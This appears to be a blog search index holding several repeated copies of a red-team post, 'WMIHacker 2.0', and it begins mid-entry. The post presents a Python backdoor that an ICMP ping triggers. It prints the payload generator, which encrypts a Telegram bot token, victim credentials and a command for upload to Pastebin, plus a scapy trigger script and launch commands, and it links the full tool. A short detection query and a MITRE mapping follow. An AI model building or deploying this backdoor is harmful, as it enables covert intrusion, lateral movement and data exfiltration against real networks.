â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--asymmetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Asymmetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction\nEarth Kurma Chain\nSymmetric \u0026amp; Asymmetric approach in C2 infra\nSymmetric C2 Asymmetric C2 WMIHacker 2.0\nDetection \u0026amp; Response\nConclusion\nIntroduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nTool Repo: https://github.com/s0ld13rr/WMIHACKER\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Asymmetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) This code (payload_gen.py) is designed to generate an encrypted payload that contains all the necessary parameters for the backdoor to operate. The payload will be uploaded to Pastebin, and the implant (on the victim machine) will later fetch, decrypt, and execute it on remote host. Parameters are separated by $$$$ and scraped on the victim host. Also, no artifacts such as BOT TOKEN or CHAT ID will be placed inside the code. It hardens the OPSEC, and may maintain the less artifacts on OS.\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) This script (checker.py) sends a specially crafted ICMP Echo Request (ping) packet to a victim machine. The payload of the ICMP packet contains an identifier called PWN (Pastebin ID) that tells the backdoor on the victim side where to fetch the encrypted payload.\nAbove you can see the Proof of Concept implementation of the WMI-based backdoor.\nOn victims host:\nPS\u0026gt; python wmihacker.py \u0026lt;LOCAL IP\u0026gt; or\nPS\u0026gt; wmihacker.exe \u0026lt;LOCAL_IP\u0026gt; # build with PyInstaller I deployed whole project here: https://github.com/s0ld13rr/WMIHACKER\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution. This is just a Proof-of-Concept tool and has several issues in OPSEC and Persistence.\nMITRE ATT\u0026amp;CK mapping The table below maps key attacker actions to MITRE ATT\u0026amp;CK techniques. It shows how the backdoor achieves things like initial access, execution, C2, and evasionâ€”using WMI, ICMP, Telegram, and more. This gives a clear view of the TTPs involved and helps defenders understand what to watch for.\nTechnique ID Description Spearphishing Attachment T1566.001 Initial access via email with malicious attachment Windows Management Instrumentation (WMI) T1047 Remote command execution using WMI Command and Scripting Interpreter: Python T1059.006 Use of Python for execution Ingress Tool Transfer T1105 Downloading payloads (e.g., from Pastebin) Application Layer Protocol: ICMP T1043 Use of ICMP for signaling Non-Application Layer Protocol T1095 C2 communication via non-standard protocols (e.g., ICMP) Exfiltration Over Web Service T1567.002 Exfiltration using Telegram Bot API Obfuscated Files or Information T1027 XOR encryption for payload confidentiality Proxy T1090 Asymmetric C2 using pivoting through internal nodes Detection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"#symmetric--asymmetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Asymmetric approach in C2 infra\u003c/a\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Asymmetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 [MITRE ATT\u0026amp;CK mapping] Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nTool Repo: https://github.com/s0ld13rr/WMIHACKER\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Asymmetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) This code (payload_gen.py) is designed to generate an encrypted payload that contains all the necessary parameters for the backdoor to operate. The payload will be uploaded to Pastebin, and the implant (on the victim machine) will later fetch, decrypt, and execute it on remote host. Parameters are separated by $$$$ and scraped on the victim host. Also, no artifacts such as BOT TOKEN or CHAT ID will be placed inside the code. It hardens the OPSEC, and may maintain the less artifacts on OS.\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) This script (checker.py) sends a specially crafted ICMP Echo Request (ping) packet to a victim machine. The payload of the ICMP packet contains an identifier called PWN (Pastebin ID) that tells the backdoor on the victim side where to fetch the encrypted payload.\nAbove you can see the Proof of Concept implementation of the WMI-based backdoor.\nOn victims host:\nPS\u0026gt; python wmihacker.py \u0026lt;LOCAL IP\u0026gt; or\nPS\u0026gt; wmihacker.exe \u0026lt;LOCAL_IP\u0026gt; # build with PyInstaller I deployed whole project here: https://github.com/s0ld13rr/WMIHACKER\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution. This is just a Proof-of-Concept tool and has several issues in OPSEC and Persistence.\nMITRE ATT\u0026amp;CK mapping The table below maps key attacker actions to MITRE ATT\u0026amp;CK techniques. It shows how the backdoor achieves things like initial access, execution, C2, and evasionâ€”using WMI, ICMP, Telegram, and more. This gives a clear view of the TTPs involved and helps defenders understand what to watch for.\nTechnique ID Description Spearphishing Attachment T1566.001 Initial access via email with malicious attachment Windows Management Instrumentation (WMI) T1047 Remote command execution using WMI Command and Scripting Interpreter: Python T1059.006 Use of Python for execution Ingress Tool Transfer T1105 Downloading payloads (e.g., from Pastebin) Application Layer Protocol: ICMP T1043 Use of ICMP for signaling Non-Application Layer Protocol T1095 C2 communication via non-standard protocols (e.g., ICMP) Exfiltration Over Web Service T1567.002 Exfiltration using Telegram Bot API Obfuscated Files or Information T1027 XOR encryption for payload confidentiality Proxy T1090 Asymmetric C2 using pivoting through internal nodes Detection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--asymmetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Asymmetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e[MITRE ATT\u0026amp;CK mapping]\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Asymmetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 MITRE ATT\u0026amp;CK mapping Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nTool Repo: https://github.com/s0ld13rr/WMIHACKER\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Asymmetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) This code (payload_gen.py) is designed to generate an encrypted payload that contains all the necessary parameters for the backdoor to operate. The payload will be uploaded to Pastebin, and the implant (on the victim machine) will later fetch, decrypt, and execute it on remote host. Parameters are separated by $$$$ and scraped on the victim host. Also, no artifacts such as BOT TOKEN or CHAT ID will be placed inside the code. It hardens the OPSEC, and may maintain the less artifacts on OS.\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) This script (checker.py) sends a specially crafted ICMP Echo Request (ping) packet to a victim machine. The payload of the ICMP packet contains an identifier called PWN (Pastebin ID) that tells the backdoor on the victim side where to fetch the encrypted payload.\nAbove you can see the Proof of Concept implementation of the WMI-based backdoor.\nOn victims host:\nPS\u0026gt; python wmihacker.py \u0026lt;LOCAL IP\u0026gt; or\nPS\u0026gt; wmihacker.exe \u0026lt;LOCAL_IP\u0026gt; # build with PyInstaller I deployed whole project here: https://github.com/s0ld13rr/WMIHACKER\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution. This is just a Proof-of-Concept tool and has several issues in OPSEC and Persistence.\nMITRE ATT\u0026amp;CK mapping The table below maps key attacker actions to MITRE ATT\u0026amp;CK techniques. It shows how the backdoor achieves things like initial access, execution, C2, and evasionâ€”using WMI, ICMP, Telegram, and more. This gives a clear view of the TTPs involved and helps defenders understand what to watch for.\nTechnique ID Description Spearphishing Attachment T1566.001 Initial access via email with malicious attachment Windows Management Instrumentation (WMI) T1047 Remote command execution using WMI Command and Scripting Interpreter: Python T1059.006 Use of Python for execution Ingress Tool Transfer T1105 Downloading payloads (e.g., from Pastebin) Application Layer Protocol: ICMP T1043 Use of ICMP for signaling Non-Application Layer Protocol T1095 C2 communication via non-standard protocols (e.g., ICMP) Exfiltration Over Web Service T1567.002 Exfiltration using Telegram Bot API Obfuscated Files or Information T1027 XOR encryption for payload confidentiality Proxy T1090 Asymmetric C2 using pivoting through internal nodes Detection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription 